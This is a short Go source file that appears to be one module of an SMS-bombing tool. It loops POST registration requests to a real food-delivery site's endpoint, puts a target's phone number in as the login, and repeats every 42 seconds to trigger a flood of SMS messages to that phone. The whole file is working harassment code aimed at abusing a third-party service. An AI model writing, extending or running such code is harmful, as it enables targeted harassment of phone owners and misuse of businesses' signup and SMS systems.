package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func jacofood() {
	req := newreq()
	req.SetBodyString("type=registration&data%5Bname%5D=%D0%98%D0%BC%D1%8F&data%5Blogin%5D=%2B" + num + "&data%5Bpwd%5D=********")
	req.SetRequestURI("https://jacofood.ru/src/php/route.php")
	req.Header.SetMethod("POST")

	timeout := time.Second * 42
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), "true") != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
